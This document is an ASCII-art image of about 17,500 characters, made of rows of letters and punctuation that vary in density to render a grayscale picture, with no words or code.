MMMMMMMMMMMMMMMMMMMMMMNNNdyooo++syyo/+shmNNmNNNds+/+oshmNNmNNNNNNNNNmNmmNNmdysooydmmmddhysoo+++oossyyyyyyhddmmNmmmmmmNNNNNNNNNNNNNmdhyo+++oossyyhdmmmNNNNNNNNmNmNNmdy+//++shhhso/:://+osyyyyyyyssoo+//////:/+oyhhhso+++oo++///+oss+/::///:/++//+syhdmmmmmmmmmmmmmddhhhyso+ooossyyhhhddddddyo+//++ooosyhhdddddmmmmmmNNNNNNNNMNdyyhddhsydNMMNms/+syssyddddddhhyssoo++oooossoosyhhhyysoo++/++++//++shmNNNNNNmdyyhdhysso++osyyyys+/+++/+ymNMMMMMMNNNMMMMMMMMNmy+//+//+ymNMMMMMMMMMMMMMNNNdhs+/::///+++shmNMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNNmdhhhhyssssyhmmNNmmNNms//oooshmNNNNNNNNNNNNmmNNNNmdhs+osyssoo+++oosyyyyyyhhhdddmmmmmNNmNNNNNNmmNNNNmmdhyso++osssssossyhmmmmNNNNNNNNNNNNNmho:::+ooooo+/:-:/syhhhhhddddhhys+///++//oosso+//+ossso+//++o+++o+/:-::///+oo+oshdmmNNNmddhyssssoooossyhhhhddddddddddddhyo/::+shhddhddmmmmmNNNNNNNMMNMNNNMMNhssyhhysymNMMNh+/osso++/////////++++ooo++oosyhddhs+//:///+++////++//+ydNNNNdyyyhdhysys+//+oyhddy+/+++/+ymNMMMMMMNNNMMMMMMMMMNdo//+++oymNMMMMMMMMMMMMMMMNNdy+/:://++oydNNMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNMNNNNNmmmmmmmmNNNNNNNmh+/oysooydNNNNNNNNNNNNNmmddhyso++++oosssyhhyyyhhhddmmmmNNmmNNNNNmNNNNNNmmmmdhyso+oossyhhhhhyyhhhddmmmmmmNmmmmmmmNNmy+---:/+++++++/::ohdddddmmmmddhs+////+++++++++++osssoooosyyyso//++/----::/+osssyhhddhysoooosssyhhhddddddmmmmmmmmmmmmmmmmho::+shdmmmmmmmmmmNNMMMMMMMMMMNMMMMNmyooo++ohmNMMNds++++++++++/++/////+++ossyhdmddyo//:::////++++++++++//+ohmmdsshddhssyys+//+ohddmh+//++/+ymNMMMMMMMMMMMMMMMMMMNmyo++++ohmNMMMMMMMMMMMNNNMNNhs/://+++oymNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNmNNNmy++shysoosdmNmmmmmdhyysoooooosyyhhhhhhhhhdddddmmmmmNNNNNmmNNNNNNmmmmmdhyso+oossyhdddddddddmmmmmmmmmmmmmmmmmmddddys/-.-:/+ooo++///:::ohdmmmmNNmdhyo+:::--:/+osyyso+/++oyyhyyssssso/://:--...-:/+osssso+++osyyyyhhhddddmmmmmmNNNNNNNNNNNmmmmhs+/+shhddmmmmmmmmmNNMMMMNNMNmhhhmNMNmds+/+oydNNMMMNmhs+/+++ooooooooossyhdmmNNNmds+/////:/++osyhdddhso+++///+syssyhysssyyso+///oyhddh+//+//ohmNMMMMMMMMMMMMMMMMMMMNho+++shmNMMMMMMMMMMMMMNNmhs+///++osydNNMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNmmmNNmh++shhhyo+osyssoooooosyyhhhhhdddddddddmmmmmmmmmmmmmNNNmNNNmmmddhysoooossyyhhdddddddmmmmmmNNmmmmmmdddmdddhyyso/:-...-:/+++++++/::////+syhddddhyo+:------:+osysso+///+syhso+/:::::////:--......--:+++///+osyhhddmmmmNNNNNNNNNNNNNNNNNmmhhyhyo:::/++++++osyhdmmmNNNNMMNNhs+++ydNMNmho/+ohmNNMMMMMNmho+oshmmmmmmmmmmmmNNNNNNmy+////////+ossyhmmNNmdys++++//////++++ooo+////:::/+/++///++oydNMMMMMMMMMMMMMMMMMMMMNy+/oydmNMMMMMMMMMNNmdhyo+//+++oosydmNMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNmmmmmdhy++shdddhyyyhhhhhdddddddddddmmmmmmNNNNmmNmmmmmmmmmmddhhyysoooooosyhhhdddddddddmmmmmmmmmmNNmmmmmmdhyyso+///::-----:/++o++/+++/::::+oo+///+//:--...--:::::::////////osyyo+///++//:/++/:--..........--:/+osyhhdmmmmmmmmmmmNNNNNNNNNmdyo+/+sys+/::/++++osyyyyhddmmNNNMNmho+shmNMMMMNdysyhmNMNNNNMMMmh+//ohmNNNNNNmmmdmmmNNNms///+++++oo+////+sydmNNmdyo++++++/:---------------://+++oosyhmNNMMMMMMNNNNNNmdhhdmNMNhsoydNMMMMMNNNmdyso++++++oooosydmNNMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNmmmmddhysssssssssyhddmmmmmmmmmddddhhhhhhddddddddddddddddhhyyssooooooooossyyhhhdddddddddmmmmmmNNmmmmmmmmmmdhhyso++///:::::-...-:/+oo++////++/:---:++//::------::-::///::////////+osyys+/+oyhhs+////:::--.........-:/+ossssssyyyyyyyhhhdddddddddhyo/:/shmmhyo++osyyhdddddyysyyydmNNNdyssyyhdmNMMMNmmmNNMMNNNMMMNmho///ohmNNNNmhyhhhhdmmhs///+++oosso+/:::/::+shmNNmdys+/++//::::::::------:/ooosyhdmNNNNNNmmddhysoooooooshmNMNNmmNNNNmmdhysoo+/++ooossssyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNNmmhhyyyyssssyyyyhhddmmmmmmmmmmmmdmmmdddddhhyyyssoooooooo++++++++oooooosssssssssssssssyyhdddmmmNNNNNmmmmmddhhsoo+///////+++//::::::::/+oyhhyso//+++/:::/+osssso+++++////+osso++osssso+oshhdhyo++oyhdyo/::::::---...------:/osyyyhhhhhhhyyyyyyso++///+oosyhdmNNNmhyso+ooosssssyssyyhdmmNNNNNmmmddmmNMMMMMNNNNNNNNNNNNNMNms++//+shmmds+osyhdddy+//++++osyso+//++syso+//sdNNNmdhyyso/////+++//:::-:oyhddmmmmddhysoooo++osyyhhdmNNNNNNNNmddhysso++++oosssyyyyhddmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNNNmddmmmmmmNNNNNNNNNNNNNNNNNNNmmddhhhyyyyyyyssssssssssssssoooooooooooooooooooossyhhdddmmmNNNNNNmmmmddhsoo+++++++++oooooooooooosyyhhhhhyyhdmmdhysoo+//+ssyyyyhhhhhhhhhyyyhhhysssyhhhhyssyhddddyo++shhyo:--::::-------:/:::/+oyyhhhhhhhhhhhhhhhhyso++shdmmNNNNNNMNNmdyooooosshddmmNNNNNNMMMMMMMNNNMNNMMMMMMNmdhhhddmmNNNNmdyys+//+ossooosyhhyo+//++oooyhyo/::/+osyhhyo//smmmmmmddhysyssyhhyyso+++oyhhssooo++oosyyhdmmNNNNNNNNNNmmmdysoo+++ooosyyyhhhddmmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNNNNMNNNNNNNNNNNNNNNNNNNMNMNNNNNNNNmmddhhhyyyysssssssssssssssyyyyyyhhhhddddmmmmmmNNmmmmmmmddhysso++++++oossyyyyyhhhddddmmmmmmNNNNNNNNmdddmmNNmmmhyoohmmmmmmNNNNNmdddmmmmmmmdysyhdddhyssyhddmdhsoosyyo/:-:::::::------///+osyddmmmmmddddddddddhhyssshmmmNNNNNNNNNNNdhyyhhhhhdmNNNNNMMMMMMMMMMMMNNMMMMNMMNNmhyo+++++ossssyyyyyso+//::////////++oooooyhddy/---:/+oyddyo++sdmmmmmddhhyssydmmmdho/:://++osyhdmmNNNNNMMMMNNNdhyyyso++ooosyhhddddmmmNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNmmmmmmmmmmmmmmNNNNNNNNNNNNNNNNNNNNNNmdhhyssooooossyyhhddmmmmmNNNNNNNNNMMMMNNNNNNNNNNNNNmmdddmNNNNNmhyydmNNNNNNNNMNNmmmmmNNNNmdysyhddddhsosyhdddddhso++:::::////:::::::::///oshdmNNNNNNmmmmNmmmmdhysyyhdmmmmNNNNNNNNmdhyhdddddddmmNNNNMMMMMMMMMMMNNMMMMNNNNNNmdyo+//++////+ooyhhysoo++/::/ossssssyyyhdmmds:---:/++shddhhhdddmmmmmhhhyssymmNmmdyssyyhddmmNNNNMMMMMMMMMMNNmdyyyhddmmmmNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMNNNmddddddmmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNmmmddmNNNNNNmdhdmNNNNNmmNNNNNNNNNNNNNmdhsyhdmmdhsoosyyhhyys+/:::-::::///////::::::::/+syhhhyso+++++oooooooooosyhyyhhddmmmNmmmdhhhddddhhhddmmNNNNNMMMMMMMMNMMMNNNNNNNNNNNdhyhdddhyssoosyhhhhy+//+syhddddddmddddmdyo:--:+o+/+ydmmmmmddmmmmdhyysosydmNNmmNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmddmmNmmdddhdmNNNMNNmddmNNNNmdhhdmNNNMMMMMMNNmdhhhddmdhs+++osso+//::::::-::::////////::----::////:--....``.....---::/++oossyhdddmmmmdhhhhdddhhhhhdmmNNNMMMMMMMMMMMMMNNNmmmmNNNNmdhdmmmdhysssso+ooo//oydmmNNNNNNNmhyyhhyo++++oss+/+ydmmmdddddmmmdhyysosydmNmmmNNNNNNMMMMMMMMNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdysyhhysooosydmNMMNNNNNMMNNmhysyhmNMMMMMMMNNNNmdhhhhdhyo///++////////::::///://+++++//::::////::::--::----------.------:/+oosyyhdddddhhhhhdddddmmmmNNNMMMMMMMMMMMMMMNNmdhdmNNNmddmmmmdhhhhhs+/////sdNNNMMMMMNNmdhyssssssyyhhhhs+oydmmmdddddddmmdhyssyhdmNmmNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNms//+o+///+oydNNMMNNNNNMNNNdyssydNNMMMMMNNNNmmdhysoooo//////////////////++++/////++++/:://+++////////////////::---::::----:///+ossssssoooossyhdmmNNNMMMMMMMMMMMMMMMNNNhsshddddddmmmmmdhhyyo+osysshmNMMMMMMNNmmdyo+//+ossyhyyyso+oosoossyhdddmmdhyssyhdmmNmNNmdhyyhddmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+/oso+/++shmNMMMNmmNNNNNmdysyhmNNNNNNNNmdhysoo+///////////////////+ooooooo++/////+/:::/+++++++++++++++++///:::///////::::::::::::---------/+oydmmNMMMMMMMMMMMMMMNNNy//+ooosyhdmmmdyssyhhhdmmhsshmNNNMNNNmdhso/////++ooooshysosyyysoooshddddhysoosydmmNNNMNmdhyyyddmNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho+syo+++oymNNMNNmhyhmNNmmhyyhmmmmmmddhyso+///////////////+++////+oossssssoooooo+++/://++ooooooo++++++//////////////////////::------------..--:/+shdNMMMMMMMMMMMNNmy//+////oyhdddhsshmmNNNmmdyoosyyyhhhhyso++///////++oshhhysyddddyysyhddhhyysoooydddmNMMMNNNmmmmdddddhhhhhdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmyoosyso/+shmNNNNmhooydmmddhyyhdhhysoo++//////+++++//////++++///++oosssssssosssssoo+//++ooooooooooo++/////++++++++++//++++++/::::////////::---....-+ydmNMMMMMMMMNNdo//+/:::/osyyyssydmmmmmmddhs+//::///////+oo+++//+oshddddhhhhyysooyyhdddhysooosyddhdmNNNNNNmmmmdddddhhyo+++oshdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMNdysyhyso++shdmNNNmhsossssoooooooo++/++++++++++++++////++++/////++ooooooooo++++oo+++//+++++++++++++////:///////+++++++++++++////+++///++///////:--..-:+oyhhmmmNNNmy+/++/:://+ooooossyyyhhhhhyyysoo++++oo++oyhddhhhhhdmmmmddhyssoossyyhhdddhso++oydhhhdmmdhhyyyyyo++oyhdmmmmdhhhhdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdyhhdhy+//+yddddhhs+/////////+++++++++++++++++++++///+++///////++++++++++++++oossssssssssssssssoo+++++++//////////:////////++++++++++++++++++/////:------::/oyhyo//+/:::/++++++++oo+++ossooosysssooooo++shdmmmmddddddddhhyyyo++oyhhddddhyo+++shdysydddyoosyhdddyyhdmmNNNNNNNNmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMNNNmddmNNNMMMMMMMMMMNmhhdddhs+::/++++++/////++++++++++++++++++++ooo++++++////////+++osssyyhhdddmmmmmNNNNNNNNNNNNNNNNmmmmmmmmmmdddhhhyssooo++////////+++++++++++oo+++++++///::::--:/++////:-:://+////++++////+oo++osyyyyso++//+osyyyssssyyyyyysoo+ooyhhddhhyssso++syhhyyhmNNNmNNNNNMMMMMMMMMMMMNNNNmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNMMNNNNNNNNNmdso+oyddmmNMMMMMMMMNmdhdhhyo+:-----:++///++++++++++++++o+++++++++++//+++++osyhddmmmNNNNNNNNNmmmmmddddddddhhhhhyhhhhhdddddddddmmmmNNNNNNNmmmmdhyso++///////+++++ooo+++ooooo+++///////////:--/////////////:///++ooossssso++ooo+/////++osssso++///+oyhhhhyso++oo++shddhhdmNNNMMMMMMMMMMMMMMMMMMMMMNNmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhyyyhhyssosyhddyo++shmNNmdmNMNMMMMMMNmys+//:::--.--/+o+++++++++++ooooooo++////+++oooshddmmNNNNNNNmmdddhhyyyyssssssoosssssssssoooossssssssosssssssyyyyyhhdddmmmNNmmmdhhysso+/////+++++oossssssoooo+++////:--//++/:://///:::://+++ooooo+++ooooo++++ooooooo++/////+ossso++++++++syhdmmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhhyyhhysooossssosyhdmmNNNmNNNNNMMMMNdy/:-:::::::::/+ooo++oooo++++++++++++//+osyhdmNNNNNNmmddddhhhhhhhyyyyhhhhhhhhhhyyyyyyyyyyyyyyssssssyyysssssssssssssssossssyyhhddmmmNNmmdhyo+//////++ossssyyyssooo+++:--:/+++///////:::::////++++++++ooo++++oooo+++++////////++++++++o+/+sddmmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdyhdmmNNNNNNNNNmhhhhddmmmNNNNNNNNMMNmds/---:///////++ossssoossooo++++///++osyhdmmNNNmmddhhyyyhhdddddmmdddddmmmmmmmmddddddddddddddddddddhhhhhhhyyyyyyyyyyyysssssssssssosssyyhhdmmNNmdhyyo+////++ooossoooooo+/:::/+oo+++++///::::::////++//++++++++++o++/////:::///////+++++oso+ohdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhhhdmmNNMMMMMMNmdhhhdmmmmmmmNNNNNNmho:---:////////+osssoosssooo++//+++oyhdmNNNNmmdddhhhhhddddmmmmmNNmmmmmmmmmmmmmmmmmmmNNNNNmmmmmmNNNNNNNNmmddhhyyyyyyyyyyyyyyyyyyyyyysssssoossyyhddmmNmmdhs+//////++++++oooo+oooooooosoo++////::://///////++////++++///::---::://++++++/+syssyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmhysyhyhhhdmmNNMMMNNmdhyyhdmmmmdhdmmNmds:..-:/++//++++++oooooooooo++++osydmNNNNmmdddddddmmmmmNNNNNNNNNNNNNNNNmmmmmddmmmmNNNNmmmmmmmNNNNNNNNNNNNNNNmddhhhhhhhhhhhhhhyyyhhhyyyyyyyyyssssssssyyhdmNNmdhso+/////+++ossssssoooosyyssooo++///////////////////////:-------::/+oooo+/:/oyyhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyssssyhddhhhhhdmNNNNNmdhhhyyhmmmmmddmmdyo:--://++++++ooooooooooooo+osyhdmNNNNmmddddddmmmNNNNNNNNNNNNNNNNMMMNNNNmmmmmmmmmNNNNmmmddmmmNNNNmNNNNNNNNNNNNmmmmmddddddddddhhhhhhhhhhhhhhhyyyyyysssssoosyhdmmNmdhso+///++oossssyysosyyysssssso+/////////////+++/:::--..---:::/+oosoo/::/oyddmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdyoooyhhhhhddhysssydmNNmmddddddhdmmmmmmdhs+/:::/+++++ossyyysssooo+++oshdmNNNmmddddddmmmNNNNNNNNNNMMMMMMMMMMMMMNNNNNmNNNNNNNNNNNNNNNNNNNNNmmmNNNNNNMMMMNNNNNNNNNNNNNNNNNmmdhhhhhhhhhhhhhhhhhhyyyyyyyssssssyydmmmmdhso+//++ooossssoosyyyyyyyso+++++///////++++/:---..---:://+oossso+//oydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhysoosydddhyhhhhysoosdmmmmdddddmdddddhhys+/:-::/++oosssyyyhyysso+++oyhmNNNmmdhhhhdmmmNNNNNMMMNNNNNNNMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNmmmmmmNNNNNNNNNNNNNNNNNNMNNNNMMMNNNNmmddhhhyhyyhhhhhhhhhhhyyyyyyyyssossyydmmmmhys++++ooosssssyyyhhyysooooo++//////++++/::----..--://+oooooo+oshdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmdhhhhhhddddddddhyyhhyyyhddmdddddddhhyys+/:-.-://++ossyyhhhhyysoooosydmNNNNmdddddmmNNNNNMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNmmmmmmNNNNNNNNNMMMMMMMMMMMNNNNNNMMMMMMNNNmmddhhhyhhhyhhhhhhhhhhhhhhhyyyssssssyhdmNmdhso+//+osssosssysssyyyso+///////++++/:::----..-:/++o+//+oyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmmmmmmmmmmmdddhssyhhhhysosyhhhhhddyo+//:----:/++oosyyhhhhyyssoosydmNNNmmddddmmNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNmNNNNNNNNNNNNNNNNMMMMMMMNNNNNNNNNNNNNNNNMMMNNNmmmddhhhhhhhhhhhhhhhhhhhhhhhyyyyyysssyhdmNmdhs+/++oooooo++oyhhyso+++//////////:::::-----:/+o+/::+oymNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNmmmmmddyyyyhhddddyo+osyyhhhhyo:-----:////+osyyyhhyyssooshdmNNNmdhdddmmNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNmmmmmmmmmmmmNNNNmmmmNNmmmmmmNNNNNNNNNNNNmmmmNmNNmmmmmmNNNNNNNMNNNmmddhhhhhhhhhhhhhhhhhhhhhhhhhhhyysssssydmNNmhso++osssssshysoooooo++///:::::///::-----:////+osyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmmdyssyhhhhhhddddddddddhyo/---:://+++oosyyyyyssoosyhmNNmmdddddmmNNNNNNMNNNNMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMNNNNNmmmmmNmmNNNNNNNNNmmmmmmmmmNNNNNMNNNNNNNNNNNNNNNNNmmmmmmmNNNNMMNNNmmmdhhhhhhhhhhhhyyhhhhhhhhhhhhhhhyyyssssydmNNdhsooosssyyyo+ossoooo+//////////::-----:/:-:odNNMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhhhssyyyyyhdmNNNNNNNmmhs/:--:///+osssssssssoooyhmNNNmdhhdmmNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNmmmmmmmmmmmmmNNNNNNmmNNNmmmmmmNNNmNNNNMMMMMMMNNNNNNNNNNNNmmmmmmmmNNNNNNNNNNdhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhyyyssoshdNNmdyoo+osyyooosoosso+++++o++////::----::::/sdNMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
